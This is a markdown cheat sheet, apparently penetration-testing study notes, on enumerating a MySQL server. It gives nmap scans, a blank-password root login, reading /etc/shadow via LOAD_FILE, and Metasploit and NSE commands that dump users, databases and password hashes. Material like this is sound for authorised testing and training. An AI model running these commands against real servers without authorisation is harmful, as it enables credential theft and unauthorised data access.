
# 🐬 MySQL Enumeration 

## 🧠 1. Getting IP Address of Target

Use any technique like `ifconfig.me`, `ip a`, or Nmap host discovery to get the target IP.

---

## 🛰️ 2. Basic Nmap Scan of MySQL

```bash
nmap <IP>
```

🔎 Scans the host to check for open ports.

```bash
nmap <IP> -sV -p 3306
```

🔍 Scans port `3306` (default MySQL port) and tries to detect the service version.

---

## 🔐 3. Attempt to Login to MySQL

```bash
mysql -h <IP> -u root
```

☑️ Attempts to connect to the MySQL server as `root` without a password.

If login is successful:

```sql
SHOW DATABASES;
USE <database_name>;
SELECT * FROM authors;
SELECT LOAD_FILE('/etc/shadow');
EXIT;
```

📝 Notes:

* `SHOW DATABASES;` – Lists all databases.
* `USE <database_name>;` – Switch to the selected database.
* `SELECT * FROM authors;` – Dump data from `authors` table.
* `SELECT LOAD_FILE('/etc/shadow');` – Tries to read `/etc/shadow` file (possible only if file\_read permissions are misconfigured).
* `EXIT;` – Close MySQL shell.

---

## 💣 4. Using Metasploit for MySQL Enumeration

### 🔎 Writable Directory Scan

```bash
msfconsole
use auxiliary/scanner/mysql/mysql_writable_dirs
options
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set RHOSTS <IP>
set VERBOSE false
set PASSWORD ""
run
```

💡 **Purpose**: Scans for writable directories inside MySQL.

---

### 🧊 Hashdump from MySQL

```bash
use auxiliary/scanner/mysql/mysql_hashdump
options
set USERNAME root
set PASSWORD ""
exploit
```

🔐 Dumps password hashes from the MySQL server if accessible.

---

## 🔬 5. MySQL NSE Scripts with Nmap

### 🔓 Check for Empty Password

```bash
nmap <IP> -sV -p 3306 --script=mysql-empty-password
```

✔️ Checks if the MySQL server allows login with a blank password.

---

### 🧾 Get MySQL Server Info

```bash
nmap <IP> -sV -p 3306 --script=mysql-info
```

📋 Retrieves information about the MySQL server version and configuration.

---

### 👤 Get MySQL Users

```bash
nmap <IP> -sV -p 3306 --script=mysql-users --script-args="mysqluser='root',mysqlpass=''"
```

📍 Lists all users in MySQL using provided credentials.

---

### 🗄️ List Databases

```bash
nmap <IP> -sV -p 3306 --script=mysql-databases --script-args="mysqluser='root',mysqlpass=''"
```

🗃️ Dumps the database names from the target MySQL server.

---

### ⚙️ MySQL System Variables

```bash
nmap <IP> -sV -p 3306 --script=mysql-variables --script-args="mysqluser='root',mysqlpass=''"
```

🔧 Retrieves internal system variables and configurations.

---

### ✅ Audit MySQL Security (CIS Benchmark)

```bash
nmap <IP> -sV -p 3306 --script=mysql-audit --script-args="mysql-audit.username='root',mysql-audit.password='',mysql-audit.filename='/usr/share/nmap/nselib/data/mysql-cis.audit'"
```

🛡️ Runs security audit checks on the MySQL server using CIS rules.

---

### 🔐 Dump MySQL Hashes

```bash
nmap <IP> -sV -p 3306 --script=mysql-dump-hashes --script-args="username='root',password=''"
```

🧂 Dumps the hashed passwords stored in the MySQL server.

---

### ❓ Run Custom Query

```bash
nmap <IP> -sV -p 3306 --script=mysql-query --script-args="query='SELECT COUNT(*) FROM book.authors;',username='root',password=''"
```

📊 Executes a custom query on the MySQL server.


---

